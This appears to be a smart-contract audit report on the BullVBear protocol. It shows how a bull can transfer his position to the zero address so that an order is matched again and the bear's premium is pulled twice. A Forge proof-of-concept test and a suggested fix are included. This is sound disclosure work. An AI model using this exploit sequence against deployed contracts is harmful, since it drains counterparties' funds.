# Malicious bull can match order multiple times

## Summary
A malicious bull can transfer his position to `address(0)` after the order has been matched, making it possible to call `matchOrder` again and force the `bear` (and himself) to send their price amount (`premium` and `collateral` respectively) to the contract one more time.

## Vulnerability Detail
After an order has been matched, function `checkIsValidOrder` prevents from another call to `matchOrder` whith this require:
https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L760
If we managed to change the `Bull` back to `address(0)` we would be able to call `matchOrder` again without revert, and force another transfer of `premium` and `collateral` from the `bear` and the `bull` respectively. 
And the bull can do this by calling the `transferPosition` function:
https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L521-L538
By calling this function passing in the `orderHash`, `isBull = true` and `recipient = address(0)` we can accomplish this and call again `matchOrder`.
This action coul be repeated as long as both the `bear` and the `bull` have enough funds and both have approved the `BullVBear` contract to spend them.

## Impact
As the cost of matching an order for a `Bull` will be greater than the cost for a `Bear` (as per the protocol documentation), the Bull would have to spend more than what he wants the `Bear` to loose. That is why I label this report as a Medium issue.

## Code Snippet
The following test, added to the file [MatchOrder.t.sol](https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/test/unit/MatchOrder.t.sol) shows the issue in action.
```solidity
function testIssueMultipleMatchingOfAnOrder() public {

	// default order has a premium of 0x9876 WETH and a collateral of 0x9876abc WETH
	BvbProtocol.Order memory order = defaultOrder();

	bytes memory signature = signOrder(bullPrivateKey, order);

	// The initial WETH balance of the bvb contract is 0
	assertEq(WETH(weth).balanceOf(address(bvb)), 0);

	bvb.matchOrder(order, signature);

	// After matching the order the WETH balance of the bvb contract 
	// is greater that premium + collateral (because of the fees)
	assertGt(WETH(weth).balanceOf(address(bvb)), 0x9876 + 0x9876abc);

	bytes32 orderHash = bvb.hashOrder(order);

	// Bull transfers the position to the zero address, making it possible to match the order again
	vm.prank(bull);
	bvb.transferPosition(orderHash, true, address(0));

	vm.prank(bull);
	bvb.matchOrder(order, signature);

	// After matching the order for the second time, the WETH balance of the bvb contract 
	// is greater that twice the premium + collateral (because of the fees)
	assertGt(WETH(weth).balanceOf(address(bvb)), (0x9876 + 0x9876abc)*2);
}
```
**NOTE**:  For the test to work, the file has to import the `WETH` contract:
`import {WETH} from "solmate/tokens/WETH.sol";`
## Tool used
Forge tests and manual Review

## Recommendation
Either prevent the `transferPosition` function to transfer to the zero address, or update the nonce of the maker when calling `matchOrder` so another call with the same Order would fail.
